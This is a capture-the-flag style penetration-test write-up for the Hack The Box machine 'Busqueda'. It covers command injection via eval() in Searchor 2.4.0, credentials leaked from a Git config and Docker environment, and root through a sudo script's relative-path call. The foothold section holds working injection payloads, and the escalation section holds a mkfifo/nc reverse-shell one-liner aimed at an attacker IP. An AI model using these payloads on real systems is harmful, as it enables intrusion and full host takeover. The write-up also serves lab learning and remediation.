# Penetration Test Report — Busqueda

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Linux-red) ![Focus](https://img.shields.io/badge/focus-command%20injection%20%2F%20Docker%20%2F%20relative%20path-lightgrey)

## Executive Summary

An authorized assessment of `target.htb` exploited a command injection vulnerability in the **Searchor 2.4.0** Python library used by a Flask search application, yielding code execution as `svc`. Credentials in a Git config granted access to a local Gitea instance, and a sudo-executable system-checkup script exposed Docker container environment variables containing Gitea admin credentials. Source-code review of the script revealed a **relative-path invocation** of `full-checkup.sh`, which was abused to execute a malicious script as root — full host compromise.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Command injection via `eval()` on user input (Searchor 2.4.0) | Critical |
| 2 | Credentials committed to Git config | High |
| 3 | Docker container environment variables exposing DB/Gitea passwords | High |
| 4 | Sudo script invoking `full-checkup.sh` via relative path | Critical |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV target.htb
echo "target.htb searcher.htb" | sudo tee -a /etc/hosts
```

SSH (22) and Apache (80) redirecting to `searcher.htb` — a search aggregator whose footer disclosed **Flask + Searchor 2.4.0**. The Searchor changelog showed a command-injection fix in 2.4.2 (an `eval()` on unsanitized input in `main.py`).

### 2. Foothold — Command Injection

Local analysis of Searchor 2.4.0 confirmed the `query` parameter reached `eval()`. Payload (validated locally, then against the web app):

```
') + str(__import__('os').system('id')) #
```

Code execution as `svc` confirmed; reverse shell via Base64-encoded bash payload:

```
')+ str(__import__('os').system('echo <base64-reverse-shell>|base64 -d|bash'))#
```

```bash
nc -nvlp 1337
cat /home/svc/user.txt
```

### 3. Lateral Movement — Git Credentials & Gitea

`/var/www/app/.git/config` contained `cody:jh1usoih2bkjaspwe92` and referenced `gitea.searcher.htb`. The password also worked for SSH (`svc`), and the credentials logged into Gitea as `cody` — revealing a private `Searcher_site` repository.

### 4. Privilege Escalation — Docker Secrets + Relative Path RCE

```bash
sudo -l
# (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

The script exposed Docker introspection:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

The gitea container's environment leaked `GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh` — which also authenticated as the **administrator** Gitea user. The private `scripts` repo contained `system-checkup.py`; its `full-checkup` action invoked `./full-checkup.sh` **relatively** — resolved from the caller's working directory.

A malicious script was planted and executed from `/tmp`:

```bash
echo -en "#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 9001 >/tmp/f" > /tmp/full-checkup.sh
chmod +x /tmp/full-checkup.sh
nc -nvlp 9001

cd /tmp
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Root shell received; `/root/root.txt` recovered.

## Remediation

- Upgrade Searchor (≥2.4.2); eliminate `eval()` on user input everywhere.
- Purge credentials from Git history; use a secrets manager; rotate exposed secrets.
- Never store secrets in container environment variables; use Docker secrets/vaults.
- Sudo-executed scripts must use absolute paths and be read-only to unprivileged users.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application |
| Credential Access | T1552.001/004 — Credentials in Files / Private repos |
| Privilege Escalation | T1548.003 — Sudo and Sudo Caching (abuse) |
| Execution | T1059.006 — Python |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
